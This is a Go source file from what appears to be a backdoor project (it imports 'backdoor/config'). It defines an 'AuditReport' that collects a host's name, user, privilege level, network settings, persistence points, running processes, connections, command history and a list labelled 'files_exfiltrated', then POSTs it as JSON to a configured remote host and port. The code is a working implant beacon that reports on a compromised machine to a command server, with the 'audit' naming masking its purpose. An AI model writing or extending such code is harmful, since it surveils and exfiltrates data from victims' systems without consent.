package report

import (
	"backdoor/config"
	"bytes"
	"encoding/json"
	"net/http"
	"time"
)

type AuditReport struct {
	AgentID       string        `json:"agent_id"`
	Hostname      string        `json:"hostname"`
	OS            string        `json:"os"`
	Arch          string        `json:"arch"`
	User          string        `json:"user"`
	Elevated      bool          `json:"elevated"`
	FirstSeen     string        `json:"first_seen"`
	LastSeen      string        `json:"last_seen"`
	IPs           []string      `json:"ips"`
	Gateway       string        `json:"gateway"`
	DNS           []string      `json:"dns"`
	Persistence   []string      `json:"persistence"`
	AntiDebug     bool          `json:"anti_debug"`
	Processes     []ProcessInfo `json:"processes"`
	Connections   []ConnInfo    `json:"connections"`
	CommandsRun   []string      `json:"commands_executed"`
	FilesAccessed []FileInfo    `json:"files_exfiltrated"`
}

func NewAuditReport() error {
	hostname, osInfo, arch, userName, _ := GetSysInfo()
	ips, err := GetIPs()
	if err != nil {
		// decidir: fallback a slice vacío o loguear
		ips = []string{}
	}
	conns, err := GetConns()
	if err != nil {
		// decidir: fallback a slice vacío o loguear
		conns = []ConnInfo{}
	}

	report := AuditReport{
		AgentID:       config.UUID,
		LastSeen:      time.Now().String(), // Initially set to first seen
		Hostname:      hostname,
		OS:            osInfo,
		Arch:          arch,
		User:          userName,
		Elevated:      IsElevated(),
		IPs:           ips,
		Gateway:       GetDefaultGateway(),
		DNS:           GetDNS(),
		Persistence:   GetPersistencePoints(),
		AntiDebug:     config.AntiDebug,
		Processes:     GetProcesses(),
		Connections:   conns,
		CommandsRun:   GetCommandHistory(),
		FilesAccessed: GetFileArtifacts(),
	}

	buf, _ := json.Marshal(report)
	resp, err := http.Post("http://"+config.Host+":"+config.Port+"/audit", "application/json", bytes.NewBuffer(buf))
	if err != nil {
		return err // o manejar el error de otra forma
	}
	defer resp.Body.Close()
	return nil
}
